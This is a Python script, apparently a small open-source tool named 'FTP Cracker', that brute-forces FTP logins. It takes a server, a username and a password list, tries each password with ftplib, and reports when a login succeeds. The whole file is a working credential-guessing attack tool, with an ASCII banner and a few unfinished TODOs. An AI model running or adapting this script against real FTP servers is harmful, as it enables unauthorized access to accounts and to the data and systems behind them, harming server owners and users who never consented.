#!/usr/bin/env python3

import sys
import ftplib
import typer

VERSION = 'v1.1'

LOGO = '''
 ______ _______ _____   _____ _____            _____ _  ________ _____  
|  ____|__   __|  __ \ / ____|  __ \     /\   / ____| |/ /  ____|  __ \ 
| |__     | |  | |__) | |    | |__) |   /  \ | |    | ' /| |__  | |__) |
|  __|    | |  |  ___/| |    |  _  /   / /\ \| |    |  < |  __| |  _  / 
| |       | |  | |    | |____| | \ \  / ____ \ |____| . \| |____| | \ \ 
|_|       |_|  |_|     \_____|_|  \_\/_/    \_\_____|_|\_\______|_|  \_\ '''

CREDITS = '		  \033[1;34mCreated by @CyberVarun (https://github.com/CyberVarun)\033[0m'


def crack(server, user, passfile):
	"""
	# TODO: write docstring
	"""
	for password in passfile:
		try:
			password = password.strip()
			typer.secho(f"trying: {password}", fg=typer.colors.GREEN)

			ftp = ftplib.FTP(server)
			if ftp.login(user, password):
				typer.secho(f"Password Found: {password}", fg=typer.colors.BRIGHT_GREEN)
				exit() # TODO: use typer.Exit() or typer.Abort() to exit

		except Exception as e:
			# TODO: handle connection not established
			typer.secho(f"Login Incorrect", fg=typer.colors.RED)

def main(
	server: str = typer.Option(..., '--server', '-s', help="Specify Server IP"),
	user: str = typer.Option(..., '--user', '-u', help="Specify User"),
	passfile: typer.FileText = typer.Option(..., '--passfile', '-p', help="Specify Password File"),
):
	"""
	Some desc
	"""
	typer.clear()  # clear the screen 
	# print logo and cretids
	typer.secho(LOGO + VERSION, fg=typer.colors.BRIGHT_CYAN)
	typer.echo(CREDITS)  

	crack(server, user, passfile)

if __name__ == '__main__':
	typer.run(main)
